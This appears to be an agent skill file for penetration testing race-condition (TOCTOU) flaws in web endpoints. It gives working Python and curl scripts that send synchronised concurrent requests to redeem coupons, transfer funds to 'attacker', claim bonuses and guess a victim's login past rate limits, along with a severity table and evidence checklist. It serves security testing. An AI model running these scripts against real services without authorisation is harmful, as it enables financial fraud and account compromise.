---
name: attack-race-condition
description: Apply when a state-changing endpoint (payment, coupon, vote, account creation, one-time claim) might process concurrent requests without a consistency lock, to prove a time-of-check-to-time-of-use race is exploitable.
metadata:
  acordia:
    family: web-attack
  cyberstrike:
    source: .cyberstrike/skill/attack-race-condition/SKILL.md
    commit: 359655518
---

# Race Condition / TOCTOU Attack

## Objective

Exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities by sending concurrent requests that bypass server-side validation.

## Testing Methodology

### Phase 1: Identify Targets

State-changing operations vulnerable to race conditions:
- Coupon/promo code redemption
- Fund transfers / payments
- Vote/like systems
- Account creation (duplicate)
- Inventory purchase
- Password/email change
- File operations

### Phase 2: Automated Race Testing

```bash
# Basic race test — 20 requests released simultaneously via a synchronized barrier
python3 - <<'PY'
import concurrent.futures, threading, json, urllib.request

url = "https://TARGET/api/redeem"
headers = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
body = b'{"coupon":"DISCOUNT50"}'
count = 20
barrier = threading.Barrier(count)

def fire(_):
    barrier.wait()  # release every thread at the same instant
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read())

with concurrent.futures.ThreadPoolExecutor(max_workers=count) as ex:
    print(json.dumps(list(ex.map(fire, range(count)))))
PY

# With delay (staggered) — 50 requests, 5s between each
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://TARGET/api/transfer \
    -H "Authorization: Bearer TOKEN" \
    -d '{"to":"attacker","amount":100}'
  sleep 5
done
```

### Phase 3: Single-Packet Attack (Turbo Intruder)

For critical timing, send all requests in a single TCP packet:

```bash
# Using curl with parallel connections
for i in $(seq 1 20); do
  curl -s -X POST https://TARGET/api/redeem \
    -H "Authorization: Bearer TOKEN" \
    -d '{"coupon":"DISCOUNT50"}' &
done
wait
```

### Phase 4: Analysis

Look for:
- Multiple successful responses (coupon applied 2+ times)
- Balance inconsistencies
- Duplicate records created
- Response length/status variations indicating multiple successes

### Phase 5: Limit Bypass Race

```bash
# Race on rate-limited endpoint — 30 concurrent login attempts
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://TARGET/api/login \
    -d '{"email":"victim@test.com","password":"guess1"}' &
done
wait

# Race on one-time action — 20 concurrent bonus claims
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://TARGET/api/claim-bonus \
    -H "Authorization: Bearer TOKEN" &
done
wait
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Financial: double-spend, duplicate transfer | Critical (P1) |
| Coupon/code reused multiple times | High (P2) |
| Rate limit bypassed via race | Medium (P3) |
| Duplicate record creation | Medium (P3) |
| Vote/like manipulation | Low (P4) |

## Evidence Requirements

- Target endpoint and parameters
- Number of concurrent requests
- Multiple successful responses proving race succeeded
- Business impact (e.g., coupon applied twice, balance doubled)
- Status code distribution from race test

## Tools

- `python3` barrier-synchronized threads / `curl` parallel loops (Phase 2–3, 5) — synchronized concurrent request senders

## References

- [PortSwigger: Race Conditions](https://portswigger.net/web-security/race-conditions)
- [James Kettle: Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine)
